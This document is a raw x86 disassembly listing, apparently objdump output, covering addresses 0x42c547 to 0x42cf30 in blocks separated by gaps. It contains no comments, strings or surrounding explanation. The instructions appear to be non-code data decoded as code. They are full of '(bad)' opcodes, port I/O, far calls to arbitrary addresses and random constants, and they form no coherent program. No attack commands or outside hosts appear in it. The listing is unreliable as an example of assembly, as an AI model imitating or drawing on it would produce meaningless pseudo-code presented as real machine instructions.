  42c547:	add    ch,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [ebp+ebx*1+0x4b],ah
  42c54f:	ins    BYTE PTR es:[edi],dx
  42c550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c551:	push   ecx
  42c552:	cld    
  42c553:	aas    
  42c554:	cs (bad) 
  42c556:	xor    eax,DWORD PTR [ecx]
  42c558:	jne    0x42c5b4
  42c55a:	lea    eax,[ecx-0x31d252c9]
  42c560:	popa   
  42c561:	jle    0x42c5b2
  42c563:	in     eax,dx
  42c564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c565:	aad    0x39
  42c567:	ret    
  42c568:	test   eax,0x94ab687a
  42c56d:	ins    BYTE PTR es:[edi],dx
  42c56e:	sub    al,0x6f
  42c570:	xor    DWORD PTR [eax],eax
  42c572:	aas    
  42c573:	outs   dx,BYTE PTR ds:[esi]
  42c574:	push   0xfb9e85d4
  42c579:	cwde   
  42c57a:	or     DWORD PTR [eax],ebx
  42c57c:	add    DWORD PTR [eax+0x3a],esi
  42c57f:	sub    eax,0x9bc0bee7
  42c584:	cmp    dl,ch
  42c586:	popf   
  42c587:	rol    ebx,0xc2
  42c58a:	sti    
  42c58b:	ret    0x2163
  42c58e:	jp     0x42c56c
  42c590:	retf   
  42c591:	(bad)  [eax+0xd]
  42c594:	push   dx
  42c596:	rcr    DWORD PTR [edi+ebp*1+0x7b],cl
  42c59a:	mov    DWORD PTR [ecx],esi
  42c59c:	dec    cx
  42c59e:	cmp    DWORD PTR [ebx-0x748f106a],esi
  42c5a4:	out    dx,eax
  42c5a5:	dec    ecx
  42c5a6:	shr    edi,cl
  42c5a8:	jmp    DWORD PTR [eax+0x1a52af9f]
  42c5ae:	popf   
  42c5af:	sub    al,0xbc
  42c5b1:	lahf   
  42c5b2:	or     dl,bh
  42c5b4:	inc    esi
  42c5b5:	sub    BYTE PTR [edx],bl
  42c5b7:	mov    cl,0xc3
  42c5b9:	mov    edi,0x5bc054e2
  42c5be:	add    esp,esp
  42c5c0:	sti    
  42c5c1:	(bad)  
  42c5c3:	(bad)  
  42c5c4:	fcmove st,st(4)
  42c5c6:	(bad)  
  42c5c7:	mov    ds:0xb42610c9,al
  42c5cc:	mov    edi,DWORD PTR [esi+0x331790d7]
  42c5d2:	in     al,dx
  42c5d3:	adc    BYTE PTR [ebp+edx*8+0x28],0x47
  42c5d8:	in     eax,dx
  42c5d9:	(bad)  
  42c5da:	xor    eax,0x81f6f43e
  42c5df:	sub    eax,0x2e058f4e
  42c5e4:	adc    bh,ch
  42c5e6:	jg     0x42c627
  42c5e8:	dec    esi
  42c5e9:	loope  0x42c606
  42c5eb:	mov    cl,0x11
  42c5ed:	and    eax,0x249789cb
  42c5f2:	sbb    eax,0xddcdf5c6
  42c5f7:	push   edi
  42c5f8:	repz jge 0x42c5aa
  42c5fb:	cld    
  42c5fc:	imul   eax,edx,0xb5a3fb5d
  42c602:	mov    ebp,0xe948b2e7
  42c607:	sbb    DWORD PTR [edx-0x79b6cbb2],ebp
  42c60d:	shl    DWORD PTR [ebx],1
  42c60f:	sub    esp,DWORD PTR [ebp-0x1aa20eac]
  42c615:	push   ecx
  42c616:	(bad)  
  42c617:	xchg   BYTE PTR [esi],bh
  42c619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c61a:	rcl    cl,1
  42c61c:	retf   0x8253
  42c61f:	xor    eax,0xc7273cd5
  42c624:	out    dx,al
  42c625:	xor    al,0xa
  42c627:	inc    ebp
  42c628:	mov    ch,0x94
  42c62a:	mov    es,WORD PTR [ebx-0x2f9dd361]
  42c630:	or     edx,DWORD PTR [ebx-0x73]
  42c633:	ds (bad) 
  42c635:	push   edi
  42c636:	mov    ds:0x85479bcf,al
  42c63b:	je     0x42c67c
  42c63d:	cmp    BYTE PTR [eax+0x21],0xe7
	...
  42c6b1:	add    BYTE PTR [eax],al
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0xc8be,0x43
  42c6c2:	ds repz ret 
  42c6c5:	aad    0x1
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    dl,al
  42c6cd:	and    al,0xd2
  42c6cf:	mov    eax,0xffd130a7
  42c6d4:	mov    DWORD PTR [eax+ebx*2-0x46],esp
  42c6d8:	jle    0x42c6c0
  42c6da:	xchg   ecx,eax
  42c6db:	(bad)  
  42c6dd:	cdq    
  42c6de:	test   BYTE PTR [edi-0xc],ch
  42c6e1:	add    BYTE PTR [ecx-0x7487e668],dh
  42c6e7:	xchg   edx,eax
  42c6e8:	test   eax,0xd544af20
  42c6ed:	ds aaa 
  42c6ef:	sub    edi,DWORD PTR [edx+0x49]
  42c6f2:	xor    ecx,DWORD PTR [ebp+0x43]
  42c6f5:	adc    BYTE PTR [edx],al
  42c6f7:	cdq    
  42c6f8:	lods   eax,DWORD PTR ds:[esi]
  42c6f9:	cwde   
  42c6fa:	jle    0x42c695
  42c6fc:	sub    eax,DWORD PTR [esi+0xb90333c]
  42c702:	in     eax,0x4f
  42c704:	sbb    al,0xe4
  42c706:	int3   
  42c707:	mov    al,ds:0xcb1eddc8
  42c70c:	(bad)  
  42c70d:	retf   
  42c70e:	ret    
  42c70f:	rcl    DWORD PTR [esi+0x48d523c6],cl
  42c715:	addr16 popf 
  42c717:	sub    edx,0xbba468e0
  42c71d:	outs   dx,DWORD PTR ds:[esi]
  42c71e:	pop    ebp
  42c71f:	scas   eax,DWORD PTR es:[edi]
  42c720:	aad    0x98
  42c722:	adc    eax,0xd9b08f8b
  42c727:	js     0x42c75a
  42c729:	pop    edx
  42c72a:	xor    eax,0x38427c7c
  42c72f:	add    ah,BYTE PTR [ecx+0x28]
  42c732:	lods   al,BYTE PTR ds:[esi]
  42c733:	mov    ds,WORD PTR [ebp-0x42]
  42c736:	pop    ds
  42c737:	ror    DWORD PTR [eax],0xa6
  42c73a:	jb     0x42c756
  42c73c:	add    eax,0x6299a794
  42c741:	xor    DWORD PTR [edi*2+0x15852670],edi
  42c748:	jl     0x42c6f7
  42c74a:	in     al,0x57
  42c74c:	mov    edx,0x25d1e151
  42c751:	loope  0x42c7bc
  42c753:	shl    DWORD PTR [ecx-0x197ca1b9],0x9d
  42c75a:	xor    DWORD PTR [ebp-0x58],ecx
  42c75d:	(bad)  
  42c75e:	lahf   
  42c75f:	pushf  
  42c760:	jle    0x42c760
  42c762:	xor    al,BYTE PTR [eax-0x23]
  42c765:	iret   
  42c766:	fdiv   st,st(1)
  42c768:	arpl   WORD PTR [ecx],bx
  42c76a:	mov    edi,0xc97024b0
  42c76f:	sub    DWORD PTR [ecx+0x33a042c7],0x6a
  42c776:	inc    ebx
  42c777:	iret   
  42c778:	add    BYTE PTR [esi-0x3a],dh
  42c77b:	mov    ch,0xe6
  42c77d:	xchg   ebp,eax
  42c77e:	inc    edi
  42c77f:	mov    dh,0x75
  42c781:	xchg   edi,eax
  42c782:	sbb    eax,edi
  42c784:	cmp    edi,ebx
  42c786:	push   esp
  42c787:	or     ecx,edx
  42c789:	mov    ds:0xce654ff8,eax
  42c78e:	adc    cl,bh
  42c790:	retf   
  42c791:	stos   BYTE PTR es:[edi],al
  42c792:	inc    esp
  42c794:	jp     0x42c74d
  42c796:	(bad)  
  42c797:	xchg   edi,eax
  42c798:	dec    ebp
  42c799:	ds cmp al,0x89
  42c79c:	int3   
  42c79d:	sbb    eax,0xd5fde6b
  42c7a2:	iret   
  42c7a3:	test   DWORD PTR [ebx],0x5d4e8221
  42c7a9:	in     al,dx
  42c7aa:	pop    ebp
  42c7ab:	arpl   WORD PTR [edx],sp
  42c7ad:	loop   0x42c7f2
  42c7af:	div    DWORD PTR ds:0x41fcd888
  42c7b5:	jo     0x42c7b7
  42c7b7:	and    ecx,DWORD PTR [eax*8+0x646115ab]
  42c7be:	stos   DWORD PTR es:[edi],eax
  42c7bf:	clc    
  42c7c0:	mov    DWORD PTR [eax],eax
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xf4c56133
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    ah,ah
  42c84d:	jo     0x42c880
  42c84f:	jmp    0x42c7fb
  42c851:	ret    0xd3f6
  42c854:	nop
  42c855:	lods   eax,DWORD PTR ss:[esi]
  42c857:	clc    
  42c858:	popf   
  42c859:	add    esp,ebx
  42c85b:	jne    0x42c866
  42c85d:	inc    ebp
  42c85e:	inc    edi
  42c85f:	je     0x42c85a
  42c861:	pop    es
  42c862:	les    ecx,FWORD PTR [ebp-0x274bb734]
  42c868:	fs retf 0x308c
  42c86c:	adc    edi,DWORD PTR [ecx]
  42c86e:	xchg   BYTE PTR [ecx-0x156293f6],ch
  42c874:	icebp  
  42c875:	and    al,0x4e
  42c877:	sti    
  42c878:	sbb    al,0xe2
  42c87a:	test   eax,0x28302e5e
  42c87f:	fmul   st(1),st
  42c881:	ds and al,0xc
  42c884:	repz xchg esi,eax
  42c886:	les    ebp,FWORD PTR [ecx-0x6e]
  42c889:	inc    esp
  42c88a:	or     al,0x32
  42c88c:	ds aaa 
  42c88e:	mov    ah,0x97
  42c890:	inc    edi
  42c891:	add    bh,dl
  42c893:	inc    ebp
  42c894:	push   cs
  42c895:	pop    esi
  42c896:	xor    DWORD PTR [ebx-0x337ac7f7],esi
  42c89c:	in     al,dx
  42c89d:	xchg   esp,eax
  42c89e:	push   esp
  42c89f:	inc    ebp
  42c8a0:	loopne 0x42c8fb
  42c8a2:	mov    BYTE PTR [edx],bl
  42c8a4:	arpl   WORD PTR [ebx],bp
  42c8a6:	icebp  
  42c8a7:	ficomp DWORD PTR [esi+0x72b924d0]
  42c8ad:	enter  0x88c0,0x1b
  42c8b1:	adc    DWORD PTR [esi+0x1108741e],ebx
  42c8b7:	and    ebx,esi
  42c8b9:	mov    bl,0x8d
  42c8bb:	and    BYTE PTR [eax+0x1a],ah
  42c8be:	cmp    eax,0xb382a446
  42c8c3:	sub    BYTE PTR [eax+0x3a],0x8f
  42c8c7:	adc    eax,0x364251d1
  42c8cc:	fxam   
  42c8ce:	cmp    al,BYTE PTR [ebx]
  42c8d0:	shl    BYTE PTR [edi+0x32],0xf4
  42c8d4:	inc    esi
  42c8d5:	mov    esp,0x4bf317e7
  42c8da:	xor    ebp,esi
  42c8dc:	(bad)  
  42c8de:	xchg   ebx,eax
  42c8df:	sub    DWORD PTR [edi+0x39],esp
  42c8e2:	pushf  
  42c8e3:	retf   0x262e
  42c8e6:	aam    0xaa
  42c8e8:	push   ecx
  42c8e9:	ins    BYTE PTR es:[edi],dx
  42c8ea:	lods   eax,DWORD PTR ds:[esi]
  42c8eb:	xchg   edx,eax
  42c8ec:	lds    ebp,FWORD PTR [edi]
  42c8ee:	lea    edx,[ebx+0x437489b4]
  42c8f4:	or     BYTE PTR [edx-0x20891f28],bl
  42c8fa:	push   esi
  42c8fb:	inc    eax
  42c8fc:	jne    0x42c939
  42c8fe:	sar    BYTE PTR [eax+0x7cfac297],0x58
  42c905:	icebp  
  42c906:	clc    
  42c907:	xor    al,0x4
  42c909:	mov    eax,ds:0x585b3617
  42c90e:	jae    0x42c91c
  42c910:	not    DWORD PTR [edx-0x3735c902]
  42c916:	lds    esp,FWORD PTR [esi]
  42c918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c919:	and    cl,BYTE PTR [eax+0x404a37fc]
  42c91f:	xor    DWORD PTR ds:0xa3e20b17,eax
  42c925:	pop    esp
  42c926:	jle    0x42c933
  42c928:	fsubr  st,st(4)
  42c92a:	cmp    al,0x81
  42c92c:	lea    esi,[eax-0x6f16b79f]
  42c932:	icebp  
  42c933:	mov    esp,DWORD PTR [ecx]
  42c935:	and    eax,0xb05e5979
  42c93a:	and    DWORD PTR [ecx+0x6f],0xfffffff0
  42c93e:	add    BYTE PTR [ebp-0x4c],dl
	...
  42c9b1:	add    BYTE PTR [eax],al
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    al,BYTE PTR [ebp-0x52d49565]
  42c9c5:	xlat   BYTE PTR ds:[ebx]
  42c9c6:	add    DWORD PTR [eax],eax
  42c9c8:	cmc    
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [edi],dl
  42c9cd:	(bad)  
  42c9ce:	jne    0x42c9a6
  42c9d0:	lahf   
  42c9d1:	inc    edi
  42c9d2:	jl     0x42ca0b
  42c9d4:	popf   
  42c9d5:	push   ecx
  42c9d6:	mov    ecx,0x68b3ac77
  42c9db:	rcr    dl,0xf7
  42c9de:	sbb    esp,esp
  42c9e0:	popf   
  42c9e1:	push   ecx
  42c9e2:	or     eax,0x4a35945a
  42c9e7:	mov    edi,eax
  42c9e9:	lods   eax,DWORD PTR ds:[esi]
  42c9ea:	das    
  42c9eb:	or     bp,WORD PTR [ecx-0x5b6f2744]
  42c9f2:	ss cld 
  42c9f4:	mov    eax,ds:0x6d8b0656
  42c9f9:	sub    edx,eax
  42c9fb:	retf   0x5d62
  42c9fe:	scas   al,BYTE PTR es:[edi]
  42c9ff:	or     al,0x6a
  42ca01:	pop    esi
  42ca02:	fcom   QWORD PTR [edx]
  42ca04:	fdiv   QWORD PTR [eax+0x52]
  42ca07:	xlat   BYTE PTR ds:[ebx]
  42ca08:	mov    ds:0xbd9114f5,al
  42ca0d:	pop    ecx
  42ca0e:	mov    WORD PTR [ecx+eiz*2-0x34],ds
  42ca12:	cmp    al,0x2c
  42ca14:	sub    esi,DWORD PTR [edi-0x672ac6f8]
  42ca1a:	mov    edx,DWORD PTR [ebp-0x62]
  42ca1d:	fidivr WORD PTR [ebx-0x77e6720a]
  42ca23:	mov    edi,DWORD PTR ds:0x3eaa5191
  42ca29:	xchg   BYTE PTR [esi-0x56],ah
  42ca2c:	hlt    
  42ca2d:	jl     0x42ca42
  42ca2f:	push   es
  42ca30:	push   ds
  42ca31:	cld    
  42ca32:	xchg   ebx,eax
  42ca33:	sub    ebx,DWORD PTR [eax+ebx*4]
  42ca36:	pop    ebp
  42ca37:	push   es
  42ca38:	out    0x14,eax
  42ca3a:	xchg   esp,eax
  42ca3b:	adc    esp,esi
  42ca3d:	lods   al,BYTE PTR ds:[esi]
  42ca3e:	sub    edx,DWORD PTR [esi]
  42ca40:	ret    0x2d0b
  42ca43:	lea    ebp,[edi+0x5e]
  42ca46:	inc    esp
  42ca47:	sbb    eax,ecx
  42ca49:	lock call 0x9c:0x536e0615
  42ca51:	mov    al,0xad
  42ca53:	mov    WORD PTR [edx+0x453ab32c],ss
  42ca59:	mov    ebp,0x6860daf2
  42ca5e:	inc    edx
  42ca5f:	out    dx,eax
  42ca60:	daa    
  42ca61:	inc    ebp
  42ca62:	jmp    0x699d3137
  42ca67:	xor    al,0xab
  42ca69:	push   ebx
  42ca6a:	test   DWORD PTR [esi],ebp
  42ca6c:	outs   dx,DWORD PTR ds:[esi]
  42ca6d:	retf   
  42ca6e:	push   ebp
  42ca6f:	sar    BYTE PTR [ebx-0x36],0x71
  42ca73:	and    al,0x25
  42ca75:	mov    ebx,ebp
  42ca77:	icebp  
  42ca78:	mov    esp,0x43e72bb8
  42ca7d:	dec    ecx
  42ca7e:	hlt    
  42ca7f:	cwde   
  42ca80:	jae    0x42ca79
  42ca82:	(bad)  
  42ca84:	pop    ecx
  42ca85:	retf   
  42ca86:	dec    esp
  42ca87:	loop   0x42caed
  42ca89:	sahf   
  42ca8a:	jo     0x42cae6
  42ca8c:	xchg   ebp,eax
  42ca8d:	push   esp
  42ca8e:	mov    edi,0x688b4ef4
  42ca93:	inc    edi
  42ca94:	sbb    ebp,DWORD PTR [edx-0x2f]
  42ca97:	xor    DWORD PTR [esi],esi
  42ca99:	xchg   edi,eax
  42ca9a:	test   eax,0x2b08f6ce
  42ca9f:	inc    edx
  42caa0:	mov    edi,DWORD PTR [ebp+0x1384ee1d]
  42caa6:	repnz imul ebp,DWORD PTR es:[ecx+ebp*2],0xd9d75ac4
  42caaf:	sbb    al,0x9d
  42cab1:	out    dx,al
  42cab2:	(bad)  [eax-0x32]
  42cab5:	pop    esi
  42cab6:	shr    BYTE PTR [ecx+0x4b],1
  42cab9:	and    eax,0x29ff2c90
  42cabe:	imul   esp,DWORD PTR [ebx-0x50],0x0
	...
  42cb31:	add    BYTE PTR [eax],al
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	cld    
  42cb41:	popf   
  42cb42:	loope  0x42cb6b
  42cb44:	mov    ds:0xf50001d8,al
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    cl,cl
  42cb4d:	jnp    0x42cb38
  42cb4f:	sar    BYTE PTR [edi-0x38],cl
  42cb52:	mov    DWORD PTR [eax-0x3d],eax
  42cb55:	neg    dh
  42cb57:	je     0x42cb6a
  42cb59:	std    
  42cb5a:	jp     0x42cb8f
  42cb5c:	mov    al,ds:0xd3a6869f
  42cb61:	sbb    BYTE PTR [ecx],dl
  42cb63:	push   0x5c
  42cb65:	xor    al,0x9c
  42cb67:	cmp    eax,0xaef946c4
  42cb6c:	add    BYTE PTR [ebp-0x23],bh
  42cb6f:	in     eax,0x20
  42cb71:	gs retf 
  42cb73:	test   al,0xd9
  42cb75:	jecxz  0x42cb50
  42cb77:	mov    esi,0x6b262308
  42cb7c:	pop    esp
  42cb7d:	jnp    0x42cbe7
  42cb7f:	and    ebx,0x91f961d
  42cb85:	iret   
  42cb86:	ja     0x42cb7d
  42cb88:	xchg   edi,eax
  42cb89:	cwde   
  42cb8a:	pop    edi
  42cb8b:	adc    al,0xfa
  42cb8d:	xor    al,0x7e
  42cb8f:	adc    DWORD PTR ds:0x6df2e9aa,ebp
  42cb95:	loope  0x42cbf5
  42cb97:	cli    
  42cb98:	aas    
  42cb99:	bound  edx,QWORD PTR [edx]
  42cb9b:	out    0xff,al
  42cb9d:	jmp    0x42cc0b
  42cb9f:	xor    al,BYTE PTR [eax]
  42cba1:	je     0x42cb37
  42cba3:	mov    ebx,0x5fb6f07f
  42cba8:	xor    esi,DWORD PTR [eax+0x9]
  42cbab:	push   es
  42cbac:	shl    BYTE PTR [edi],cl
  42cbae:	cld    
  42cbaf:	retf   
  42cbb0:	aaa    
  42cbb1:	cld    
  42cbb2:	mov    esi,0xe790b8f3
  42cbb7:	fsub   QWORD PTR [edx+ebx*2]
  42cbba:	dec    edx
  42cbbb:	xchg   edx,eax
  42cbbc:	jl     0x42cc12
  42cbbe:	jp     0x42cbe2
  42cbc0:	jg     0x42cbb1
  42cbc2:	inc    esi
  42cbc3:	fld    DWORD PTR [eax+0x28]
  42cbc6:	mov    ecx,ss
  42cbc8:	push   ds
  42cbc9:	xchg   edi,eax
  42cbca:	aam    0x70
  42cbcc:	sbb    ah,0xdb
  42cbcf:	enter  0x1808,0x90
  42cbd3:	xor    DWORD PTR [edi-0x533aeb69],eax
  42cbd9:	or     esp,DWORD PTR [eax-0xf]
  42cbdc:	sub    eax,ebx
  42cbde:	jmp    0x42cc06
  42cbe0:	in     eax,0xb4
  42cbe2:	jecxz  0x42cbef
  42cbe4:	jmp    0x42cb70
  42cbe6:	xchg   ebp,eax
  42cbe7:	or     al,0x1f
  42cbe9:	(bad)  
  42cbea:	loopne 0x42cbde
  42cbec:	ret    
  42cbed:	les    esi,FWORD PTR [ecx]
  42cbef:	imul   eax,DWORD PTR [edi-0x22],0xffffffc9
  42cbf3:	add    ch,dl
  42cbf5:	inc    edx
  42cbf6:	add    al,BYTE PTR ds:0xdec10cf9
  42cbfc:	pop    es
  42cbfd:	jle    0x42cc20
  42cbff:	(bad)  
  42cc00:	dec    esi
  42cc01:	jmp    DWORD PTR [esi]
  42cc03:	or     eax,0xb67a6b3a
  42cc08:	ret    0x6332
  42cc0b:	cmp    eax,0xa04ad071
  42cc10:	sahf   
  42cc11:	cmp    eax,0x6e8ff725
  42cc16:	add    BYTE PTR [ecx+0x39980288],ch
  42cc1c:	out    dx,al
  42cc1d:	sbb    al,0x22
  42cc1f:	mov    dh,bl
  42cc21:	cmp    al,0x54
  42cc23:	xor    ch,BYTE PTR [ebp-0x6b5a830b]
  42cc29:	or     eax,0x7eaa212b
  42cc2e:	data16 into 
  42cc30:	ror    BYTE PTR [ebx-0x2c297c1c],1
  42cc36:	ret    0x9df0
  42cc39:	adc    al,BYTE PTR [ebp+0x6e9af77d]
  42cc3f:	inc    ecx
  42cc40:	mov    eax,0x0
	...
  42ccb1:	add    BYTE PTR [eax],al
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    esp,DWORD PTR [ecx-0x68a00c60]
  42ccc5:	fld    DWORD PTR [ecx]
  42ccc7:	add    ch,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [edx+0x6e],dh
  42ccce:	mov    eax,0xcdfe742a
  42ccd3:	sub    al,0xc4
  42ccd5:	into   
  42ccd6:	push   cs
  42ccd7:	and    cl,0xa
  42ccda:	cdq    
  42ccdb:	in     al,0x3d
  42ccdd:	icebp  
  42ccde:	daa    
  42ccdf:	mov    BYTE PTR [eax-0x4655dadf],cl
  42cce5:	jno    0x42cc88
  42cce7:	sub    esi,DWORD PTR [edx]
  42cce9:	loop   0x42cd1f
  42cceb:	arpl   WORD PTR [eax-0xf79883a],cx
  42ccf1:	adc    ebp,ecx
  42ccf3:	pop    esp
  42ccf4:	xlat   BYTE PTR ds:[ebx]
  42ccf5:	cmp    ecx,ebx
  42ccf7:	jo     0x42ccf8
  42ccf9:	pop    ebp
  42ccfa:	in     al,0xdc
  42ccfc:	xchg   esp,eax
  42ccfd:	scas   eax,DWORD PTR es:[edi]
  42ccfe:	outs   dx,WORD PTR ds:[esi]
  42cd00:	(bad)  
  42cd01:	mov    ds:0x8a99f0f8,eax
  42cd06:	jne    0x42cc92
  42cd08:	cmc    
  42cd09:	adc    eax,0x6b6f1a1d
  42cd0e:	clc    
  42cd0f:	out    dx,eax
  42cd10:	xchg   edi,eax
  42cd11:	ins    DWORD PTR es:[edi],dx
  42cd12:	lahf   
  42cd13:	hlt    
  42cd14:	sbb    al,0x16
  42cd16:	ins    BYTE PTR es:[edi],dx
  42cd17:	push   ebx
  42cd18:	push   ss
  42cd19:	mov    es,ebp
  42cd1b:	push   esi
  42cd1c:	push   0x7bd5c6e0
  42cd21:	ss pop esp
  42cd23:	les    ebx,FWORD PTR [eax+0x15e59563]
  42cd29:	and    ch,ah
  42cd2b:	nop
  42cd2c:	test   BYTE PTR [ebp+edi*8-0x45],dh
  42cd30:	mov    dh,0xca
  42cd32:	(bad)  
  42cd33:	(bad)  
  42cd34:	jno    0x42cd6c
  42cd36:	xor    eax,0xfffa863e
  42cd3b:	push   eax
  42cd3c:	adc    dh,BYTE PTR [eax-0x28]
  42cd3f:	bound  ebp,QWORD PTR [eax-0x1a]
  42cd42:	clc    
  42cd43:	int    0xee
  42cd45:	call   0xc799:0x4348baa0
  42cd4c:	add    DWORD PTR [ecx+0x6d],esi
  42cd4f:	xchg   ebp,eax
  42cd50:	ins    DWORD PTR es:[edi],dx
  42cd51:	pusha  
  42cd52:	push   esi
  42cd53:	int    0x51
  42cd55:	shr    BYTE PTR [esi],1
  42cd57:	fstp   DWORD PTR [ebx]
  42cd59:	mov    ecx,0x670744f1
  42cd5e:	cmp    dh,BYTE PTR [eax]
  42cd60:	sbb    edx,esi
  42cd62:	ja     0x42cd5f
  42cd64:	sbb    al,0x3d
  42cd66:	push   eax
  42cd67:	jl     0x42cceb
  42cd69:	call   0x39368ff5
  42cd6e:	addr16 jae 0x42cdbc
  42cd71:	mov    cl,BYTE PTR [ecx+0x27be34a6]
  42cd77:	daa    
  42cd78:	(bad)  
  42cd79:	cld    
  42cd7a:	jo     0x42cd55
  42cd7c:	push   ebx
  42cd7d:	add    BYTE PTR [ebx-0x5c282ad4],al
  42cd83:	ja     0x42cd0f
  42cd85:	xor    eax,0xcf22fb0
  42cd8a:	push   cs
  42cd8b:	push   0xffffffa0
  42cd8d:	sbb    dl,BYTE PTR ds:0x57028ee1
  42cd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd94:	stos   DWORD PTR es:[edi],eax
  42cd95:	dec    eax
  42cd96:	mov    eax,ds:0x5e5cb1b
  42cd9b:	hlt    
  42cd9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd9d:	mov    cl,0x61
  42cd9f:	enter  0x7c65,0x2c
  42cda3:	push   esp
  42cda4:	or     cl,0xdc
  42cda7:	adc    eax,0xc05305b8
  42cdac:	pop    es
  42cdad:	sar    BYTE PTR [edx-0x3a],1
  42cdb0:	xor    ah,BYTE PTR ds:0xed12359a
  42cdb6:	pop    eax
  42cdb7:	or     BYTE PTR [eax],bh
  42cdb9:	fnstenv [eax-0x57]
  42cdbc:	and    dl,dh
  42cdbe:	cmp    bl,dl
  42cdc0:	jl     0x42cdc2
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0xe119410a
  42ce41:	xchg   ebp,eax
  42ce42:	mov    bl,BYTE PTR [ebx]
  42ce44:	mov    edx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	cmc    
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    BYTE PTR [edx+esi*1+0x71023884],bl
  42ce52:	je     0x42ce7c
  42ce54:	int    0xe6
  42ce56:	je     0x42ceaa
  42ce58:	xor    al,0x7c
  42ce5a:	fld    DWORD PTR [ecx-0x7573cbc4]
  42ce60:	xor    ah,BYTE PTR [edi]
  42ce62:	adc    cl,BYTE PTR [edx-0x52f43c0f]
  42ce68:	mov    WORD PTR [ebp+0x6d],?
  42ce6b:	mov    eax,ds:0x63226331
  42ce70:	pop    edi
  42ce71:	push   0x37fe4f86
  42ce76:	jl     0x42ce60
  42ce78:	aaa    
  42ce79:	push   0xffffffd1
  42ce7b:	jle    0x42ce83
  42ce7d:	push   edi
  42ce7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce7f:	inc    eax
  42ce80:	sbb    ebp,edx
  42ce82:	loop   0x42ce2d
  42ce84:	mov    dh,0xa8
  42ce86:	ja     0x42ced8
  42ce88:	stos   DWORD PTR es:[edi],eax
  42ce89:	add    eax,0xce445907
  42ce8e:	pop    es
  42ce8f:	pop    ebp
  42ce90:	mov    ecx,0x1f3abf59
  42ce95:	sbb    edx,0x42
  42ce98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce99:	out    0x6a,eax
  42ce9b:	sahf   
  42ce9c:	jge    0x42ce75
  42ce9e:	adc    BYTE PTR [ebx-0x4c4b43ad],bh
  42cea4:	es jns 0x42ce6f
  42cea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cea8:	push   ss
  42cea9:	and    ecx,esp
  42ceab:	aaa    
  42ceac:	add    al,ch
  42ceae:	pop    edx
  42ceaf:	or     BYTE PTR [edx-0x72cb7269],ch
  42ceb5:	fnstsw WORD PTR [ecx]
  42ceb7:	or     BYTE PTR [esi-0x79],ah
  42ceba:	cmp    al,BYTE PTR [eax+0x58297ebe]
  42cec0:	adc    BYTE PTR ds:0xeb731144,dl
  42cec6:	fild   DWORD PTR [edi+ebx*2+0x4c30e805]
  42cecd:	jle    0x42cedc
  42cecf:	adc    DWORD PTR [eax],ecx
  42ced1:	test   al,0xb6
  42ced3:	js     0x42cebf
  42ced5:	sbb    al,0x8a
  42ced7:	dec    edi
  42ced8:	dec    ebp
  42ced9:	fidiv  DWORD PTR [edi-0x6887731a]
  42cedf:	lds    eax,FWORD PTR [ebx-0x68]
  42cee2:	cdq    
  42cee3:	int3   
  42cee4:	cmp    dh,al
  42cee6:	cdq    
  42cee7:	xlat   BYTE PTR ds:[ebx]
  42cee8:	inc    ebp
  42cee9:	mov    WORD PTR [edi-0x7ce4dbd],ds
  42ceef:	mov    al,ds:0x936d63d6
  42cef4:	or     al,BYTE PTR [ebx+0x4d]
  42cef7:	fadd   DWORD PTR [edi-0x6fff8f22]
  42cefd:	call   0xb670ebc9
  42cf02:	add    ch,bl
  42cf04:	pop    es
  42cf05:	js     0x42cf22
  42cf07:	dec    esp
  42cf08:	inc    esp
  42cf09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf0a:	fs add ebp,esi
  42cf0d:	inc    esi
  42cf0e:	fistp  WORD PTR [eax+0x51c93502]
  42cf14:	cld    
  42cf15:	xor    esp,DWORD PTR [edx+eiz*1]
  42cf18:	adc    al,0x1
  42cf1a:	mov    ecx,0x9ddb2ccf
  42cf1f:	cmp    eax,0x3b3397f7
  42cf24:	fadd   QWORD PTR [eax+edx*2+0x6b773315]
  42cf2b:	jg     0x42cef6
  42cf2d:	shr    DWORD PTR [eax-0x14],1
  42cf30:	pop    ss
